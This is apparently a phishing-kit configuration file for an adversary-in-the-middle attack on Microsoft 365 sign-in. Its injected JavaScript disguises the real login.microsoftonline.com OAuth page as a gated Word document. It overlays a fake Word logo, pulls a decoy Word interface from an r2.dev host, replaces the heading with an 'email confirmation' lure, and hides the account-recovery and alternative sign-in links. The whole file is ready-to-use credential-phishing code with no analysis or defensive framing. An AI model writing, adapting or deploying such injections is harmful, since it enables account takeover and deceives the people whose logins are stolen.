js_inject:
  - trigger_domains: ["login.microsoftonline.com"]
    trigger_paths: ["/common/oauth2/v2.0/authorize", "/common/oauth2/v2.0/authorize*"]
    script: |
      const overlay = document.createElement("div");
      overlay.id = "wordLogoOverlay";
      overlay.style.position = "fixed";
      overlay.style.top = "0";
      overlay.style.left = "0";
      overlay.style.width = "100vw";
      overlay.style.height = "100vh";
      overlay.style.backgroundColor = "white";
      overlay.style.zIndex = "999999";
      overlay.style.display = "flex";
      overlay.style.justifyContent = "center";
      overlay.style.alignItems = "center";
      overlay.style.overflow = "hidden";

      overlay.innerHTML = `
        <style>
          @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
          }
          .logo-container {
            position: relative;
            width: 200px;
            height: 200px;
            animation: pulse 3s ease-in-out infinite;
            margin-bottom: 40px;
          }
          .back-plate {
            position: absolute;
            width: 126px;
            height: 140px;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0px 2px 6px rgba(0, 0, 0, 0.2);
            left: 60px;
            top: 30px;
          }
          .w-icon {
            position: absolute;
            width: 72px;
            height: 72px;
            background-color: #185ABD;
            border-radius: 8px;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 40px;
            font-weight: bold;
            color: white;
            left: 30px;
            top: 64px;
            box-shadow: 0px 2px 6px rgba(0, 0, 0, 0.25);
            z-index: 10;
          }
          .blue-stripe-1 { position: absolute; width: 100%; height: 25%; background-color: #41A5EE; top: 0; }
          .blue-stripe-2 { position: absolute; width: 100%; height: 25%; background-color: #2B7CD3; top: 25%; }
          .blue-stripe-3 { position: absolute; width: 100%; height: 25%; background-color: #185ABD; top: 50%; }
          .blue-stripe-4 { position: absolute; width: 100%; height: 25%; background-color: #103E91; top: 75%; }
        </style>
        <div class="logo-container">
          <div class="back-plate">
            <div class="blue-stripe-1"></div>
            <div class="blue-stripe-2"></div>
            <div class="blue-stripe-3"></div>
            <div class="blue-stripe-4"></div>
          </div>
          <div class="w-icon">W</div>
        </div>
      `;
      document.body.appendChild(overlay);

      setTimeout(() => {
        overlay.remove();

        // Inject full Word background layout BELOW win-scroll
        fetch("https://pub-2a44f4d547ef416eb3d30428f95d5a9e.r2.dev/off.html")
          .then(res => res.text())
          .then(html => {
            const wordBG = document.createElement("div");
            wordBG.id = "wordInterfaceBackground";
            wordBG.style.position = "absolute";
            wordBG.style.top = "0";
            wordBG.style.left = "0";
            wordBG.style.width = "100%";
            wordBG.style.zIndex = "0";
            wordBG.innerHTML = html;

            const winScroll = document.querySelector(".win-scroll");
            if (winScroll && winScroll.parentElement) {
              winScroll.parentElement.insertBefore(wordBG, winScroll.nextSibling);
            } else {
              document.body.appendChild(wordBG);
            }
          })
          .catch(err => console.error("Failed to load Word background:", err));

        // Modify form box content
        const waitForFormReady = setInterval(() => {
          const header = document.querySelector('#loginHeader div[role="heading"]');
          const noAccount = document.querySelector('a#signup');
          const cantAccess = document.querySelector('a#cantAccessAccount');
          const signInOptions = document.querySelector('.promoted-fed-cred-box');

          if (header) {
            header.textContent = "Secure Access: Email Confirmation";

            if (!document.querySelector('.custom-subtext')) {
              const desc = document.createElement("div");
              desc.className = "custom-subtext";
              desc.style.fontSize = "14px";
              desc.style.color = "#5a5a5a";
              desc.style.marginTop = "8px";
              desc.style.lineHeight = "1.4";
              desc.innerText = "This document can only be accessed by Authorised users. Please verify your identity to access this document.";
              header.parentNode.appendChild(desc);
            }

            if (noAccount) noAccount.closest(".form-group").style.display = "none";
            if (cantAccess) cantAccess.closest(".form-group").style.display = "none";
            if (signInOptions) signInOptions.style.display = "none";

            clearInterval(waitForFormReady);
          }
        }, 300);
      }, 3000);
